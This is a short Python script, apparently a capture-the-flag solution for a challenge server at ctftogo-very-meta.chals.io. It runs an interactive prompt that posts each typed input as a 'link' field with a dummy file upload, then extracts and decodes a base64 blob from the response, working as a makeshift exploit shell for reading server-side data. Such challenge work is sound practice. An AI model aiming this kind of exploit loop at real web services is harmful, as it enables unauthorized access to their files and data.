import requests
import re
from base64 import b64decode

url = 'https://ctftogo-very-meta.chals.io/'
files={"file": "file"}

while True:
    try:
        inp = input('-$ ')
        if inp.lower() != 'q':
            data={"link": inp}
            response = requests.post(url, files=files, data=data)
            r = re.search('base64,([^"]*)', response.text).group(1)
            decoded = b64decode(r).decode('utf-8')
            print(decoded)
        else:
            exit()
    except Exception as e:
        print(e)
